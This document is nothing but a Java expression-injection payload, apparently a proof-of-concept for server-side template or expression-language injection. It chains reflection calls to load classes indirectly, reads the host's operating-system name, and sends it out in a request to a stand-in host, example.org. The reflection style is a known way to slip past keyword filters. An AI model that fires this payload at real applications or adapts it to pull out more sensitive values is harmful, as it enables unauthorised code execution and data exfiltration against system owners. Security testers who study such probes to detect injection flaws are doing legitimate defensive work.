"".getClass().forName("java.net.URL")
.getConstructor("".getClass().forName("java.lang.String"))
.newInstance(
  "https://example.org/test?data=".concat(
    "".getClass().forName("java.net.URLEncoder").getMethod("encode", "".getClass().forName("java.lang.String"))
    .invoke(null,
      "".getClass().forName("java.lang.System").getMethod("getProperty", "".getClass().forName("java.lang.String")).invoke(null, "os.name")
    .toString())
  )
).openStream()
